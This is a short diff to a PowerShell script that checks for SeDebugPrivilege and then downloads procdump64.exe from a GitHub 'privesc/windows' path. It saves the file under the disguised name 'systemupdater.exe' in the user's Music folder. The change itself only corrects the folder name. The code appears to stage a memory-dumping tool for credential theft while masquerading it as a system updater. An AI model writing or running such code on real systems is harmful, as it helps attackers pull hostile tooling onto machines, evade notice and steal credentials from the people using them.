@@ -30,7 +30,7 @@ if (-not (Check-SeDebugPrivilege)) {
 
 try {
     $procdumpUrl = "https://github.com/paulkwalton/thescriptvault/raw/refs/heads/main/privesc/windows/procdump64.exe"
-    $desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("music"), "systemupdater.exe")
+    $desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("mymusic"), "systemupdater.exe")
     Invoke-WebRequest -Uri $procdumpUrl -OutFile $desktopPath -UseBasicParsing
     Write-Output "systemupdater.exe downloaded to: $desktopPath"
 } catch {
